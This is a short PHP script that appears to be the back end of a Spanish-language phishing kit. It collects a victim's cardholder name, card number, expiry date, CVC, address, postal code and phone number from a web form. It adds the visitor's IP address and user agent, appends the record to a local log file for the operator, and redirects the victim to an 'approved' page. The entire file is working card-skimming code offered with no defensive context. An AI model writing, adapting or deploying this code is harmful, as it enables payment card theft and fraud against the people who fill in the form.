<?php

if (isset($_POST['btnstart'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Nombre           : ".$_POST['name']."\n";
	$message .= "CC            : ".$_POST['cnum']."\n";
	$message .= "Venc            : ".$_POST['exp']."\n";
	$message .= "Cvc            : ".$_POST['cvc']."\n";
	$message .= "Direccion            : ".$_POST['dir']."\n";
	$message .= "Cp           : ".$_POST['cp']."\n";
	$message .= "Numero           : ".$_POST['num']."\n";

	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- Edited bY Sc4rfac3 --------------|\n";

	
	$save=fopen("access/login.txt","a+");
	          fwrite($save,$message);
	          fclose($save);

	          $discoverbank = [
              'text' => $message
              ]; 

		header("Location: ./aprobado");

	
}

?>